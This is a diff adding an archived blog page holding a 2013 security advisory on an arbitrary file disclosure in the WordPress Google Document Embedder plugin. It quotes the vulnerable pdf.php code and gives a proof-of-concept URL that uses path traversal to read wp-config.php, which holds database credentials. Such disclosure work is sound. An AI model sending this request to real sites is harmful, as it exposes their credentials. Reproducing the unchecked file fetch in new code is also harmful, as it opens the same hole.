@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+<base href="http://ceriksen.com" />
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+<title>WordPress Google Document Embedder arbitrary file disclosure | ceriksen.com</title>
+
+<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />
+
+<!--[if lt IE 9]>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
+<![endif]-->
+
+
+
+<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>
+
+ 
+
+<link rel='next' title='WordPress Zingiri Forums arbitrary file disclosure' href='http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/' />
+
+<link rel='canonical' href='http://ceriksen.com/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/' />
+<link rel='shortlink' href='http://ceriksen.com/?p=167' />
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-32892239-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+	<script type="text/javascript">
+		jQuery(document).ready(function(){
+			jQuery("#page").fitVids();	 
+		});
+	</script>	<style type="text/css">
+			#site-title a,
+		#site-description {
+			color: #e6941e !important;
+		}
+		</style>
+	
+</head>
+
+<body lang="en" class="single single-post postid-167 single-format-standard  single-author singular">
+<div id="page" class="hfeed">
+	<header id="branding" role="banner">
+		<hgroup>
+			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
+			<h2 id="site-description"></h2>
+						
+							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
+				<div>
+					<label class="screen-reader-text" for="s">Search for:</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="Search" />
+				</div>
+			</form>					</hgroup>
+		
+		<nav id="access" role="navigation">
+			<h2 class="assistive-text">Main menu</h2>
+			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
+
+			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>
+
+		</nav><!-- #access -->
+		<div class="clear"></div>
+	</header><!-- #branding -->
+
+	<div id="main">
+		<div id="primary">
+			<div id="content" role="main">
+
+			
+				
+				
+<article id="post-167" class="post-167 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-google-document-embedder tag-wordpress-plugin">
+	<header class="entry-header">
+				<h2 class="entry-title">WordPress Google Document Embedder arbitrary file disclosure</h2>
+		
+		<div class="entry-meta">
+			<a href="http://ceriksen.com/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/" title="2:10 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-03T14:10:34+00:00" pubdate>January 3, 2013</time></a>		</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+				<p><strong>Advisory</strong></p>
+<p><a href="http://secunia.com/advisories/50832">Secunia Advisory SA50832</a></p>
+<p><strong>Analysis of vulnerability</strong></p>
+<p>Google Document Embedder offers a proxy for forcing a PDF to download rather than use the default browser handler. It implements this through <a href="http://plugins.svn.wordpress.org/google-document-embedder/trunk/libs/pdf.php">/libs/pdf.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98786bd0e1876057796" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+if (ini_get('allow_url_fopen') !== "1") {
+	if (function_exists('curl_version')) {
+		$curl = 1;
+	} else {
+		$err = "This function is not supported on your web server. Please add ";
+		$err .= "&lt;code&gt;allow_url_fopen = 1&lt;/code&gt; to your php.ini or enable cURL library. ";
+		$err .= "If you are unable to do this, please change the Link Behavior setting to ";
+		$err .= "Browser Default in GDE Options.";
+		showErr($err);
+		exit;
+	}
+}
+
+if ((isset($_GET['fn'])) &amp;&amp; (isset($_GET['file']))) { 
+	// check for invalid file type
+	if (!preg_match("/\.pdf$/i",$_GET['fn'])) {
+		showErr('Invalid file type; action cancelled.');
+	}
+
+	// ready file
+	$file = urldecode($file);
+	$fileParts = parse_url($file);
+	if (preg_match("/^https/i", $fileParts['scheme'])) {
+		$ssl = true;
+	} else {
+		$ssl = false;
+	}
+
+	// get file
+	if ($curl) {
+		$code = @curl_get_contents($_GET['file'], $ssl);  
+	} else {
+		$code = @file_get_contents($_GET['file']); 
+	}
+
+	// output file
+	header('Content-type: application/pdf');
+	header('Content-Disposition: attachment; filename="'.$_GET['fn'].'"');
+	echo $code;</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-8">8</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-9">9</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-10">10</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-11">11</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-12">12</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-13">13</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-14">14</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-15">15</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-16">16</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-17">17</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-18">18</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-19">19</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-20">20</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-21">21</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-22">22</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-23">23</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-24">24</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-25">25</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-26">26</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-27">27</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-28">28</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-29">29</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-30">30</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-31">31</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-32">32</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-33">33</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-34">34</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-35">35</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-36">36</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-37">37</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-38">38</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-39">39</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-40">40</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-41">41</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-42">42</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-43">43</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-44">44</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98786bd0e1876057796-45">45</div><div class="crayon-num" data-line="crayon-53c98786bd0e1876057796-46">46</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98786bd0e1876057796-8"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">ini_get</span><span class="crayon-sy">(</span><span class="crayon-s">'allow_url_fopen'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-s">"1"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">function_exists</span><span class="crayon-sy">(</span><span class="crayon-s">'curl_version'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$curl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"This function is not supported on your web server. Please add "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;code&gt;allow_url_fopen = 1&lt;/code&gt; to your php.ini or enable cURL library. "</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"If you are unable to do this, please change the Link Behavior setting to "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$err</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Browser Default in GDE Options."</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">showErr</span><span class="crayon-sy">(</span><span class="crayon-v">$err</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-19"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-20">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-21"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-k ">isset</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check for invalid file type</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">preg_match</span><span class="crayon-sy">(</span><span class="crayon-s">"/\.pdf$/i"</span><span class="crayon-sy">,</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">showErr</span><span class="crayon-sy">(</span><span class="crayon-s">'Invalid file type; action cancelled.'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-26">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// ready file</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">urldecode</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$fileParts</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">parse_url</span><span class="crayon-sy">(</span><span class="crayon-v">$file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">preg_match</span><span class="crayon-sy">(</span><span class="crayon-s">"/^https/i"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$fileParts</span><span class="crayon-sy">[</span><span class="crayon-s">'scheme'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$ssl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$ssl</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-35">&nbsp;</div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get file</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$curl</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-e">curl_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$ssl</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-e">file_get_contents</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-42">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// output file</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: application/pdf'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98786bd0e1876057796-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename="'</span><span class="crayon-sy">.</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'fn'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-s">'"'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98786bd0e1876057796-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$code</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0175 seconds] -->
+<p>First it will check if allow_url_fopen is enabled. Then it checks the two variables we need to provide, the &#8220;fn&#8221;(Filename) and &#8220;file&#8221; GET parameters. If both are provided it will verify that the filename ends in .pdf. From there, it goes onto deicing how to fetch the file, and eventually call into file_get_contents by passing the file GET parameter straight into the call. Note that the filename is only used to determine the filename returned on line 45. Because it will use file_get_contents if at all possible, we can provide a local path to include. We can for instance fetch the wp-config.php file like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98786bd0f9117060523" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+http://192.168.80.130/wordpress/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&amp;file=../../../../wp-config.php</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98786bd0f9117060523-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98786bd0f9117060523-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&amp;file=../../../../wp-config.php</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p>&nbsp;</p>
+					</div><!-- .entry-content -->
+
+	<footer class="entry-meta">
